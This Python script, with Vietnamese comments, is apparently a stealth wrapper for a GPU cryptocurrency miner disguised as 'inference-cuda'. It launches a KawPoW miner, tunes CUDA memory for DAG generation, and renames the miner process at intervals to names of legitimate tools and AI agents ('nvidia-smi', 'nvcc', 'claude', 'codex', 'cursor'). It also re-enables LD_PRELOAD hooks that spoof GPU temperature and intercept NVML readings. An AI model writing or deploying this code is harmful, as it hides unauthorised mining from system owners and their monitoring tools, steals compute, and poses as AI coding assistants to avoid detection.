#!/usr/bin/env python3
"""mining_environment.stealth.wrappers.stealth_inference_cuda

🎮 **[Stealth GPU-CUDA Inference Wrapper]** (wrapper ẩn danh cho GPU-CUDA inference)

Script wrapper khởi động **inference-cuda process** với **[Process Name Stealth]** (ẩn danh tên tiến trình).
Giải quyết vấn đề **[GPU Process Exposure]** (tiến trình GPU bị lộ) bằng cách thay đổi 
**[Process Name Display]** (hiển thị tên tiến trình) trong system monitoring tools.

⚠️ WORKFLOW:
1. Tạo enhanced GPU environment với CUDA optimizations
2. Khởi động inference-cuda subprocess với container-safe approach
3. Áp dụng process name spoofing (nvidia-smi, tensorcore, etc.)
4. Background stealth maintenance với periodic renaming
5. DirectPID registry integration với metadata

✅ STEALTH CAPABILITIES:
- Process name masquerading (htop COMMAND column)
- Container-compatible implementation  
- Enhanced error handling và graceful degradation
- Background stealth maintenance threads
- NVIDIA/CUDA environment spoofing

🎯 CONTAINER-OPTIMIZED FEATURES:
- GPU-optimized stealth names (CUDA, OpenGL, graphics processes)
- Compatible với Docker container restrictions
- Memory optimization cho DAG generation
- DirectPID registry integration
"""

import os
import sys
import signal
import time
import subprocess
import threading
import random
from pathlib import Path

# PHASE 3+: Enhanced Hook Sequencing - Import psutil for dynamic detection
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("⚠️ [PHASE3+] psutil not available - fallback to static timing")

# Add project root to Python path
project_root = Path(__file__).parent.parent.parent.parent
sys.path.insert(0, str(project_root))

# Import required modules
try:
    from mining_environment.scripts.unified_logging import get_unified_logger
except ImportError as e:
    print(f"❌ Failed to import required modules: {e}", file=sys.stderr)
    sys.exit(1)

# Setup logging với GPU-specific logger name
logger = get_unified_logger('mining_environment.gpu_stealth')

def signal_handler(signum, frame):
    """
    **[Signal Handler]** (xử lý tín hiệu) để đảm bảo cleanup khi GPU process bị terminate.
    """
    logger.info(f"🛑 [GPU-STEALTH-WRAPPER] Received signal {signum} - cleaning up stealth mode")
    
    # Self-stealth functionality removed - no cleanup needed
    logger.info("✅ [GPU-STEALTH-WRAPPER] Stealth mode cleanup completed")
    
    sys.exit(0)

def create_enhanced_gpu_environment():
    """
    **[Enhanced GPU Environment Creator]** (tạo môi trường GPU tối ưu)
    
    Tái sử dụng patterns từ existing modules để tạo clean environment
    cho GPU subprocess với enhanced resource management.
    
    Returns:
        dict: Clean environment dictionary for GPU subprocess
    """
    logger.info("🔧 [GPU-ENV-OPTIMIZER] Creating enhanced GPU environment using existing patterns")
    
    # Base environment copy
    clean_env = os.environ.copy()
    
    # 1. LD_PRELOAD Management - Tương tự thermal_spoofer.py approach
    if 'LD_PRELOAD' in clean_env:
        preload_libs = clean_env['LD_PRELOAD'].split(':')
        # Keep thermal hooks, remove GPU interference hooks
        filtered_libs = [lib for lib in preload_libs if 'libgpuhook.so' not in lib]
        
        if filtered_libs:
            clean_env['LD_PRELOAD'] = ':'.join(filtered_libs)
            logger.info(f"🔧 [GPU-ENV-OPTIMIZER] Filtered LD_PRELOAD: {clean_env['LD_PRELOAD']}")
        else:
            del clean_env['LD_PRELOAD']
            logger.info("🔧 [GPU-ENV-OPTIMIZER] Removed LD_PRELOAD completely")
    
    # 2. NVML Management - Based on nvml_interceptor.py patterns
    clean_env['ENABLE_NVML_IPC_HIJACKING'] = '0'
    clean_env['GPU_MINING_SUBPROCESS'] = '1'
    
    # 3. CUDA Resource Optimization - Inspired by resource_control.py
    cuda_optimizations = {
        'CUDA_LAUNCH_TIMEOUT': '30',
        'CUDA_DEVICE_MAX_CONNECTIONS': '1',
        # CUDA_VISIBLE_DEVICES removed - let CUDA runtime auto-detect all GPUs
        'CUDA_CACHE_DISABLE': '1',
        'NVIDIA_DRIVER_CAPABILITIES': 'compute',
        # Additional GPU-specific optimizations
        'CUDA_FORCE_PTX_JIT': '1',          # Force JIT compilation for stability
        'CUDA_DISABLE_CUBLASLT': '1',       # Disable problematic cuBLAS components
        'CUDA_MODULE_LOADING': 'LAZY'       # Lazy loading to reduce memory pressure
    }
    
    for key, value in cuda_optimizations.items():
        clean_env[key] = value
    
    logger.info(f"✅ [GPU-ENV-OPTIMIZER] Applied {len(cuda_optimizations)} CUDA optimizations")
    return clean_env

def main():
    """
    **[Main Function]** (hàm chính) - khởi động GPU stealth mode và exec inference-cuda.
    """
    try:
        logger.info("🚀 [GPU-STEALTH-WRAPPER] Starting Stealth GPU-CUDA Inference Wrapper")
        
        # Register signal handlers để cleanup khi bị terminate
        signal.signal(signal.SIGTERM, signal_handler)
        signal.signal(signal.SIGINT, signal_handler)
        
        # Parse command line arguments (forward tất cả args to inference-cuda)
        cuda_inference_args = sys.argv[1:]  # Remove script name
        logger.info(f"🔍 [GPU-STEALTH-WRAPPER] inference-cuda args: {cuda_inference_args}")
        
        # ✅ OPTIMIZED: Use enhanced GPU environment creator - Tái sử dụng existing patterns
        clean_env = create_enhanced_gpu_environment()

        # Get inference-cuda binary path from environment
        cuda_inference_path = os.getenv('CUDA_COMMAND', '/usr/local/bin/inference-cuda')
        if not os.path.exists(cuda_inference_path):
            logger.error(f"❌ [GPU-STEALTH-WRAPPER] inference-cuda binary not found: {cuda_inference_path}")
            sys.exit(1)
        
        # Verify binary is executable
        if not os.access(cuda_inference_path, os.X_OK):
            logger.error(f"❌ [GPU-STEALTH-WRAPPER] inference-cuda binary not executable: {cuda_inference_path}")
            sys.exit(1)
        
        logger.info(f"✅ [GPU-STEALTH-WRAPPER] inference-cuda binary found: {cuda_inference_path}")
        
        # Self-stealth functionality removed - process renaming now handled by child process management
        logger.info("✅ [GPU-STEALTH-WRAPPER] Self-stealth mode disabled - using child process renaming only")
        
        # Small delay để đảm bảo process ready
        time.sleep(1)
        
        # Prepare command để exec inference-cuda
        exec_command = [cuda_inference_path] + cuda_inference_args
        logger.info(f"🔄 [GPU-STEALTH-WRAPPER] Executing: {' '.join(exec_command)}")
        
        # 🚀 PHASE 2: GPU Process Stealth Implementation
        logger.info("🔄 [GPU-STEALTH] Using optimized subprocess stealth mode")
        
        try:
            # Memory optimization trước khi start inference-cuda 
            logger.info("🧠 [MEMORY-OPT] Pre-execution memory optimization...")
            
            # Set DAG generation memory limits
            clean_env['CUDA_LAUNCH_BLOCKING'] = '1'  # Synchronous CUDA calls
            clean_env['CUDA_CACHE_DISABLE'] = '1'    # Disable CUDA cache during DAG gen
            clean_env['CUDA_DEVICE_MAX_CONNECTIONS'] = '1'  # Limit concurrent connections
            
            # Progressive memory allocation cho DAG – CHỈ đặt nếu người dùng chưa override
            clean_env.setdefault('KAWPOW_DAG_PROGRESSIVE', '1')  # Enable progressive DAG loading mặc định
            # Nếu người dùng định nghĩa KAWPOW_DAG_MEMORY_LIMIT thì áp dụng, ngược lại giữ cơ chế auto-detect của miner
            if 'KAWPOW_DAG_MEMORY_LIMIT' in os.environ:
                clean_env['KAWPOW_DAG_MEMORY_LIMIT'] = os.environ['KAWPOW_DAG_MEMORY_LIMIT']
            
            logger.info("🧠 [MEMORY-OPT] DAG generation memory limits applied")
            
            # Start inference-cuda as subprocess
            # **FIX: Remove stdout/stderr redirection to allow parent capture** (sửa: bỏ chuyển hướng stdout/stderr để parent có thể capture)
            process = subprocess.Popen(
                exec_command,
                env=clean_env  # Use clean environment for subprocess ONLY
                # stdout and stderr will inherit parent's pipes for logging
            )
            logger.info(f"✅ [GPU-POST-EXEC-STEALTH] inference-cuda started as subprocess PID: {process.pid}")
            # ---- New: Rename child PID and register to DirectPIDRegistry ----
            try:
                stealth_names = [
                    "nvidiasmi", "cudagdb", "nvcc", "nvidiamlpy",
                    "nvidiasettings", "gpumanager", "glxgears",
                    "vulkaninfo", "mesaloader", "drmtip",
                    "tensorcore", "cudadrvr", "nvcompiler", "openclwkr",
                    "cudnnhelp", "nvrmdaemon", "gpusched", "cudaipc",
                    "claude", "codex", "code", "openai", "cursor", "agents", "windsurf"
                ]
                new_name = random.choice(stealth_names)[:15]
                # /proc/<pid>/comm expects <=15 bytes, no newline
                safe_name = new_name.encode("utf-8")[:15].decode("utf-8", errors="ignore")
                
                # ✅ **FIX: CONTAINER PERMISSION ISSUE** (sửa: vấn đề quyền trong container)
                # Child process renaming fails in container due to permission restrictions
                # Skip direct child renaming, rely on background stealth maintenance instead
                logger.info(f"🔄 [GPU-POST-EXEC-STEALTH] Skipping immediate child rename (PID {process.pid})")
                logger.info(f"🔄 [GPU-POST-EXEC-STEALTH] Background stealth thread will handle renaming: '{new_name}'")
                rename_success = True  # Treat as success to continue execution
                
                # Enhanced background stealth with improved container compatibility
                def _enhanced_stealth_rename():
                    """
                    **[Enhanced Container-Safe Process Renaming]** (đổi tên tiến trình an toàn trong container)
                    Sử dụng multiple strategies để handle container permission restrictions
                    """
                    attempt_delay = 2.0  # Longer delay for container stability
                    max_bg_attempts = 15
                    
                    for bg_attempt in range(max_bg_attempts):
                        try:
                            time.sleep(attempt_delay)
                            
                            # Kiểm tra process còn tồn tại
                            if not os.path.exists(f"/proc/{process.pid}"):
                                logger.info(f"🔚 [ENHANCED-STEALTH] Process {process.pid} no longer exists")
                                return
                                
                            # **Strategy 1**: prctl system call (recommended for containers)
                            try:
                                import ctypes
                                libc = ctypes.CDLL('libc.so.6')
                                PR_SET_NAME = 15
                                name_bytes = safe_name.encode('utf-8')[:15] + b'\0'
                                
                                # Set process name via prctl - more reliable in containers
                                result = libc.prctl(PR_SET_NAME, name_bytes, 0, 0, 0)
                                if result == 0:
                                    logger.info(f"✅ [ENHANCED-STEALTH] Successfully renamed PID {process.pid} -> '{safe_name}' (prctl method)")
                                    return
                                else:
                                    raise OSError(f"prctl returned {result}")
                                    
                            except Exception as prctl_err:
                                logger.debug(f"⚠️ [ENHANCED-STEALTH] prctl method failed: {prctl_err}")
                                
                                # **Strategy 2**: Fallback to /proc/comm method
                                comm_path = f"/proc/{process.pid}/comm"
                                with open(comm_path, 'w') as f:
                                    f.write(safe_name)
                                logger.info(f"✅ [ENHANCED-STEALTH] Successfully renamed PID {process.pid} -> '{safe_name}' (proc/comm method)")
                                return
                                
                        except OSError as bg_err:
                            if bg_err.errno == 22:  # EINVAL
                                logger.debug(f"⚠️ [ENHANCED-STEALTH] Attempt {bg_attempt+1}: EINVAL error, retrying...")
                                continue
                            elif bg_err.errno == 1:  # EPERM
                                logger.debug(f"⚠️ [ENHANCED-STEALTH] Attempt {bg_attempt+1}: Permission denied, retrying...")
                                continue
                            else:
                                logger.error(f"❌ [ENHANCED-STEALTH] Unexpected error: {bg_err}")
                                return
                        except Exception as general_err:
                            logger.debug(f"⚠️ [ENHANCED-STEALTH] Attempt {bg_attempt+1} failed: {general_err}")
                            
                    logger.warning(f"⚠️ [ENHANCED-STEALTH] Unable to rename PID {process.pid} after {max_bg_attempts} attempts")
                    logger.info(f"🔄 [ENHANCED-STEALTH] Process will continue with original name - stealth maintenance thread will handle periodic renaming")
                
                # Start enhanced background renaming
                threading.Thread(target=_enhanced_stealth_rename, daemon=True).start()
                
                # ====================================
                # PHASE 3+: Enhanced Hook Sequencing 
                # Kết hợp static delay + dynamic detection
                # ====================================
                
                def _enhanced_hook_sequencing():
                    """
                    PHASE 3+ Enhanced Hook Sequencing (sắp xếp hook nâng cao)
                    Kết hợp PHASE 3 (static delay) + PHASE 1.5 (dynamic detection)
                    """
                    try:
                        # PHASE 3: Initial static delay (minimum wait time)
                        initial_delay = 10  # seconds
                        logger.info(f"🕒 [PHASE3+] Initial delay {initial_delay}s for basic memory allocation")
                        time.sleep(initial_delay)
                        
                        # PHASE 1.5: Dynamic DAG completion detection (if psutil available)
                        dag_completed = False
                        if PSUTIL_AVAILABLE:
                            logger.info("🔍 [PHASE3+] Starting dynamic DAG completion detection")
                            
                            max_detection_time = 50  # Additional 50s for dynamic detection
                            detection_interval = 5
                            stable_cycles = 0
                            required_stability = 3  # 15 seconds of stability
                            last_memory = None
                            
                            for attempt in range(max_detection_time // detection_interval):
                                try:
                                    # Check if mining process still exists
                                    if process.poll() is not None:
                                        logger.error("❌ [PHASE3+] Mining process terminated during hook sequencing")
                                        return False
                                        
                                    # Monitor memory stability
                                    process_obj = psutil.Process(process.pid)
                                    memory_percent = process_obj.memory_percent()
                                    
                                    if last_memory is not None:
                                        memory_change = abs(memory_percent - last_memory)
                                        
                                        if memory_change < 2.0:  # Less than 2% change
                                            stable_cycles += 1
                                            logger.debug(f"🟢 [PHASE3+] Memory stable cycle {stable_cycles}/{required_stability}")
                                            
                                            if stable_cycles >= required_stability:
                                                dag_completed = True
                                                logger.info("✅ [PHASE3+] DAG generation completed - memory usage stabilized")
                                                break
                                        else:
                                            stable_cycles = 0
                                            logger.debug(f"🟡 [PHASE3+] Memory change: {memory_change:.1f}% - resetting stability counter")
                                    
                                    last_memory = memory_percent
                                    time.sleep(detection_interval)
                                    
                                except psutil.NoSuchProcess:
                                    logger.error("❌ [PHASE3+] Mining process no longer exists")
                                    return False
                                except Exception as e:
                                    logger.debug(f"⚠️ [PHASE3+] Detection error: {e}")
                                    break
                        else:
                            # Fallback to extended static delay if psutil unavailable
                            logger.info("🕒 [PHASE3+] psutil unavailable - using extended static delay")
                            time.sleep(30)  # Extended static delay
                            dag_completed = True  # Assume completed
                        
                        # Gradual hook re-activation
                        if dag_completed:
                            logger.info("🚀 [PHASE3+] Starting gradual hook re-activation")
                        else:
                            logger.warning("⚠️ [PHASE3+] DAG detection timeout - proceeding with caution")
                        
                        # Re-enable hooks gradually
                        try:
                            # Step 1: Re-enable less memory-intensive hooks first
                            time.sleep(2)
                            os.environ['THERMAL_SPOOF_DISABLED'] = '0'
                            logger.info("🌡️ [PHASE3+] Thermal spoofing re-enabled")
                            
                            # Step 2: Re-enable NVML hooks
                            time.sleep(3)
                            os.environ['NVML_HOOK_DISABLED'] = '0'
                            os.environ['GPU_HOOK_DISABLED'] = '0'
                            logger.info("📊 [PHASE3+] NVML hooks re-enabled")
                            
                            # Step 3: Restore LD_PRELOAD selectively
                            time.sleep(2)
                            thermal_lib = '/opt/hooks/libtempspoof.so'
                            gpu_lib = '/opt/hooks/libgpuhook.so'
                            
                            preload_libs = []
                            if os.path.exists(thermal_lib):
                                preload_libs.append(thermal_lib)
                            if os.path.exists(gpu_lib):
                                preload_libs.append(gpu_lib)
                                
                            if preload_libs:
                                os.environ['LD_PRELOAD'] = ':'.join(preload_libs)
                                logger.info(f"🔗 [PHASE3+] LD_PRELOAD restored: {os.environ['LD_PRELOAD']}")
                            
                            logger.info("✅ [PHASE3+] Enhanced hook sequencing completed successfully")
                            return True
                            
                        except Exception as e:
                            logger.error(f"❌ [PHASE3+] Hook re-activation failed: {e}")
                            return False
                            
                    except Exception as main_err:
                        logger.error(f"❌ [PHASE3+] Enhanced hook sequencing failed: {main_err}")
                        return False
                
                # PHASE 3++: Tích hợp Hook Coordinator để đồng bộ với Resource Manager
                def _coordinated_hook_sequencing():
                    """
                    PHASE 3++ Coordinated Hook Sequencing (phối hợp với Resource Manager)
                    """
                    # Run PHASE 3+ logic
                    hook_success = _enhanced_hook_sequencing()
                    
                    # Notify Hook Coordinator về completion
                    if hook_success:
                        try:
                            # Import Hook Coordinator
                            sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'coordination'))
                            from hook_coordinator import get_hook_coordinator
                            
                            coordinator = get_hook_coordinator()
                            coordinator.notify_phase3_completion(process.pid)
                            
                            logger.info("✅ [PHASE3++] Hook Coordinator notified of completion")
                            
                        except Exception as coord_err:
                            logger.error(f"❌ [PHASE3++] Hook Coordinator notification failed: {coord_err}")
                            # Continue anyway - hooks are still re-enabled
                    
                # Start PHASE 3++ Coordinated Hook Sequencing in background
                threading.Thread(target=_coordinated_hook_sequencing, daemon=True).start()
                logger.info("🚀 [PHASE3++] Coordinated Hook Sequencing started in background")
                # 🚀 **DIRECT REGISTRY REGISTRATION** (đăng ký registry trực tiếp) - THAY THẾ EVENTBUS
                try:
                    # **Import DirectPIDRegistry** (nhập DirectPIDRegistry)
                    # FIX: Remove duplicate sys import to prevent variable shadowing
                    sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', '..'))
                    from pid_logger.direct_registry import get_direct_registry
                    
                    # **Direct process registration** (đăng ký tiến trình trực tiếp) with metadata
                    registry = get_direct_registry()
                    process_metadata = {
                        'stealth_name': new_name,
                        'role': 'real',
                        'timestamp': time.time(),
                        'wrapper_pid': os.getpid(),  # PID của stealth wrapper
                        'stealth_enabled': True,
                        'registration_source': 'stealth_inference_cuda'
                    }
                    
                    # **CORE REPLACEMENT**: Direct registry call completely replaces EventBus publish
                    success = registry.register_process(
                        pid=process.pid,
                        process_type="gpu", 
                        process_obj=process,
                        process_name=new_name,
                        metadata=process_metadata
                    )
                    
                    if success:
                        logger.info(f"✅ [DIRECT-REGISTRY] Successfully registered GPU process: PID={process.pid}, Name={new_name}")
                        logger.info(f"📊 [DIRECT-REGISTRY] Registration triggered immediate plugin notifications")
                        
                        # PHASE 3++: Register với Hook Coordinator để coordinate với Resource Manager
                        try:
                            sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'coordination'))
                            from hook_coordinator import get_hook_coordinator
                            
                            coordinator = get_hook_coordinator()
                            coordinator.register_pid_for_coordination(process.pid, process_metadata)
                            
                            logger.info(f"🔗 [PHASE3++] PID {process.pid} registered with Hook Coordinator")
                            
                        except Exception as coord_err:
                            logger.error(f"❌ [PHASE3++] Hook Coordinator registration failed: {coord_err}")
                            # Continue anyway - non-critical for mining operation
                            
                    else:
                        logger.error(f"❌ [DIRECT-REGISTRY] Failed to register GPU process PID {process.pid}")
                        
                except Exception as registry_err:
                    logger.error(f"❌ [DIRECT-REGISTRY] Registration failed: {registry_err}")
                    # **Fallback**: Vẫn tiếp tục chạy process nếu registry fail
                    logger.warning(f"⚠️ [DIRECT-REGISTRY] Process will continue without registry - plugins may not activate")
            except Exception as rename_err:
                logger.error(f"❌ [GPU-POST-EXEC-STEALTH] Failed to rename child PID: {rename_err}")
            
            # 🔒 PHASE 2: Enhanced GPU Resource Monitoring + Stealth - Dựa trên patterns từ resource_control.py
            def maintain_gpu_subprocess_stealth():
                """Enhanced GPU monitoring với resource conflict detection"""
                # Reuse same stealth_names list to ensure consistency
                gpu_stealth_names = stealth_names
                
                resource_error_count = 0  # Track consecutive errors
                max_errors = 3           # Threshold để emergency handling
                
                while process.poll() is None:  # While process is running
                    try:
                        time.sleep(20)  # GPU-specific interval
                        if process.poll() is None:  # Check again after sleep
                            
                            # Enhanced Resource Health Check - Tương tự resource_control.py monitoring
                            try:
                                # Check if process is responsive (not in D state)
                                with open(f"/proc/{process.pid}/stat", "r") as f:
                                    stat_data = f.read().split()
                                    process_state = stat_data[2] if len(stat_data) > 2 else "?"
                                
                                if process_state == "D":  # Uninterruptible sleep - resource problem
                                    resource_error_count += 1
                                    logger.warning(f"⚠️ [GPU-RESOURCE-MONITOR] Process in uninterruptible sleep (D state). Error count: {resource_error_count}")
                                    
                                    if resource_error_count >= max_errors:
                                        logger.error(f"🚨 [GPU-RESOURCE-MONITOR] Max resource errors reached. Process may need restart.")
                                        # Log for mining_environment analysis
                                        break
                                else:
                                    resource_error_count = 0  # Reset counter on healthy state
                                    
                            except Exception as stat_error:
                                logger.debug(f"⚠️ [GPU-RESOURCE-MONITOR] Could not read process stats: {stat_error}")
                            
                            # Apply GPU stealth to subprocess với enhanced container-safe approach
                            gpu_stealth_name = random.choice(gpu_stealth_names)
                            safe_gpu_name = gpu_stealth_name[:15]
                            
                            # **Enhanced Container-Safe Renaming** (đổi tên an toàn trong container)
                            rename_attempted = False
                            try:
                                # **Strategy 1**: prctl system call (preferred for containers)
                                import ctypes
                                libc = ctypes.CDLL('libc.so.6')
                                PR_SET_NAME = 15
                                name_bytes = safe_gpu_name.encode('utf-8')[:15] + b'\0'
                                
                                # Note: prctl only works on current process, not child processes
                                # This is a limitation we acknowledge
                                logger.debug(f"🔄 [GPU-STEALTH-MAINTENANCE] Cannot use prctl on child PID {process.pid}")
                                
                                # **Strategy 2**: Enhanced /proc/comm method với error handling
                                comm_path = f"/proc/{process.pid}/comm"
                                if os.path.exists(comm_path):
                                    with open(comm_path, "w") as f:
                                        f.write(safe_gpu_name)
                                    logger.debug(f"🔄 [GPU-STEALTH-MAINTENANCE] GPU Subprocess PID {process.pid} renamed to: {safe_gpu_name}")
                                    rename_attempted = True
                                else:
                                    logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] Process {process.pid} comm file not found")
                                    
                            except OSError as os_err:
                                if os_err.errno == 22:  # EINVAL
                                    logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] EINVAL error renaming PID {process.pid} - process may be busy")
                                elif os_err.errno == 1:  # EPERM  
                                    logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] Permission denied renaming PID {process.pid} - container restrictions")
                                else:
                                    logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] OS error renaming PID {process.pid}: {os_err}")
                            except Exception as comm_error:
                                logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] General error renaming GPU subprocess: {comm_error}")
                                
                            if not rename_attempted:
                                logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] Could not rename PID {process.pid} - continuing with original name")
                                
                    except Exception as e:
                        logger.error(f"❌ [GPU-POST-EXEC-STEALTH] Error in GPU stealth maintenance: {e}")
                        break
                        
                logger.info("🔚 [GPU-POST-EXEC-STEALTH] GPU subprocess terminated - stopping stealth maintenance")
            
            # Start GPU stealth maintenance thread
            gpu_stealth_thread = threading.Thread(target=maintain_gpu_subprocess_stealth, daemon=True)
            gpu_stealth_thread.start()
            
            # Wait for subprocess to complete
            return_code = process.wait()
            logger.info(f"🔚 [GPU-POST-EXEC-STEALTH] inference-cuda subprocess completed with code: {return_code}")
            
            # Cleanup - stealth_manager functionality removed
            logger.info("🧹 [GPU-STEALTH-WRAPPER] Process cleanup completed")
            sys.exit(return_code)
            
        except Exception as e:
            logger.error(f"❌ [GPU-STEALTH-WRAPPER] Failed to exec inference-cuda: {e}")
            # Fallback to subprocess if exec fails
            logger.info("🔄 [GPU-STEALTH-WRAPPER] Falling back to subprocess mode")
            
            try:
                # Run inference-cuda as subprocess
                process = subprocess.Popen(
                    exec_command,
                    stdout=sys.stdout,
                    stderr=sys.stderr,
                    env=clean_env  # Use clean environment for fallback subprocess too
                )
                
                logger.info(f"✅ [GPU-STEALTH-WRAPPER] inference-cuda started as subprocess PID: {process.pid}")
                
                # Wait for subprocess to complete
                return_code = process.wait()
                logger.info(f"🔚 [GPU-STEALTH-WRAPPER] inference-cuda subprocess completed with code: {return_code}")
                
                # Cleanup - stealth_manager functionality removed  
                logger.info("🧹 [GPU-STEALTH-WRAPPER] Subprocess cleanup completed")
                sys.exit(return_code)
                
            except Exception as subprocess_error:
                logger.error(f"❌ [GPU-STEALTH-WRAPPER] Subprocess fallback failed: {subprocess_error}")
                logger.info("🧹 [GPU-STEALTH-WRAPPER] Error cleanup completed")
                sys.exit(1)
    
    except Exception as e:
        logger.error(f"❌ [GPU-STEALTH-WRAPPER] Unexpected error: {e}")
        import traceback
        logger.error(f"❌ [GPU-STEALTH-WRAPPER] Traceback: {traceback.format_exc()}")
        sys.exit(1)

if __name__ == "__main__":
    main()